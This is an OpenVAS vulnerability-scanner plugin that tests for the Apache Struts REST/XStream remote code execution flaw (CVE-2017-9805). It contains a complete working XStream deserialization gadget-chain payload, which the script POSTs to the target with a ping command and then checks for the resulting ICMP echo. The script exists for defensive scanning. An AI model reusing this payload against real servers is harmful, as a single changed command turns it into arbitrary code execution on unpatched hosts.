###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 7077 2017-09-07 13:41:54Z santu $
#
# Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:struts";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811730");
  script_version("$Revision: 7077 $");
  script_cve_id("CVE-2017-9805");
  script_bugtraq_id(100609);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-09-07 15:41:54 +0200 (Thu, 07 Sep 2017) $");
  script_tag(name:"creation_date", value:"2017-09-07 16:39:09 +0530 (Thu, 07 Sep 2017)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability");

  script_tag(name:"summary", value:"This host is running Apache Struts and is
  prone to remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check
  whether we are able to execute arbitrary code or not.");

  script_tag(name:"insight", value:"The flaw exists within the REST plugin which
  is using a XStreamHandler with an instance of XStream for deserialization
  without any type filtering.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow
  an attacker to execute arbitrary code in the context of the affected application.
  Failed exploit attempts will likely result in denial-of-service conditions. 

  Impact Level: System/Application");

  script_tag(name:"affected", value:"Apache Struts versions 2.5 through 2.5.12,
  2.1.2 through 2.3.33.");

  script_tag(name: "solution" , value:"Upgrade to Apache Struts version 2.5.13
  or 2.3.34 or later. For updates refer to,
  http://struts.apache.org");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name : "URL" , value : "https://struts.apache.org/docs/s2-052.html");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("webmirror.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

##Variable Initialization
apachePort = "";
soc = "";
check = "";
pattern = "";
len = "";
req = "";
res = "";
host = "";
data = "";

apachePort =  get_http_port( default:8080 );

actions = get_kb_list( "www/" + apachePort + "/content/extensions/action" );
if( actions && is_array( actions ) ) found = TRUE;

dos = get_kb_list( "www/" + apachePort + "/content/extensions/do" );
if( dos && is_array( dos ) ) found = TRUE;

jsps = get_kb_list( "www/" + apachePort + "/content/extensions/jsp" );
if( jsps && is_array( jsps ) ) found = TRUE;

if( ! found ) exit( 0 );

## Open Socket
soc = open_sock_tcp(apachePort);
if(!soc){
  exit(0);
}

##Check platform
if(host_runs("Windows") == "yes")
{
  ## Construct command to be executed on Windows
  COMMAND = '<string>ping</string><string>-n</string><string>3</string><string>'+ this_host() + '</string>';
  win = TRUE;
}
else
{
  ##For Linux and Unix platform
  check = "__OpenVAS__" + rand_str(length:4);
  pattern = hexstr(check);
  ## Construct command to be executed on Linux/Unix
  COMMAND = '<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>' + pattern + '</string><string>'+ this_host() + '</string>';
}

##Get Host Name
host = http_host_name(port:apachePort);
if(!host){
  exit(0);
}

## Construct POSTDATA
data = 
'				<map>
				<entry>
				<jdk.nashorn.internal.objects.NativeString>
				<flags>0</flags>
				<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
				<dataHandler>
				<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
				<is class="javax.crypto.CipherInputStream">
				<cipher class="javax.crypto.NullCipher">
				<initialized>false</initialized>
				<opmode>0</opmode>
				<serviceIterator class="javax.imageio.spi.FilterIterator">
				<iter class="javax.imageio.spi.FilterIterator">
				<iter class="java.util.Collections$EmptyIterator"/>
				<next class="java.lang.ProcessBuilder">
				<command>
				' + COMMAND + '
				</command>
				<redirectErrorStream>false</redirectErrorStream>
				</next>
				</iter>
				<filter class="javax.imageio.ImageIO$ContainsFilter">
				<method>
				<class>java.lang.ProcessBuilder</class>
				<name>start</name>
				<parameter-types/>
				</method>
				<name>foo</name>
				</filter>
				<next class="string">foo</next>
				</serviceIterator>
				<lock/>
				</cipher>
				<input class="java.lang.ProcessBuilder$NullInputStream"/>
				<ibuffer/>
				<done>false</done>
				<ostart>0</ostart>
				<ofinish>0</ofinish>
				<closed>false</closed>
				</is>
				<consumed>false</consumed>
				</dataSource>
				<transferFlavors/>
				</dataHandler>
				<dataLen>0</dataLen>
				</value>
				</jdk.nashorn.internal.objects.NativeString>
				<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
				</entry>
				<entry>
				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
				</entry>
				</map>';
				
## POSTDATA Length
len = strlen(data);
if(!len){
  exit(0);
}

## Attack URL
url = '/struts2-rest-showcase/orders/3';

##Construct POST Request
req = http_post_req( port: apachePort,
                     url: url,
                     data: data,
                     add_headers: make_array( 'Content-Type', 'application/xml'));

##Send POST Req and Get response
res = send_capture( socket:soc,
                    data:req,
                    timeout:2,
                    pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );

##Confirm Response
if(res && (win || check >< res))
{
  report = "It was possible to execute command remotely at " + report_vuln_url( port:apachePort, url:url, url_only:TRUE ) + " with the command '" + COMMAND + "'.";
  security_message( port:apachePort, data:report);
  close(soc);
  exit(0);
}
close(soc);
exit(0);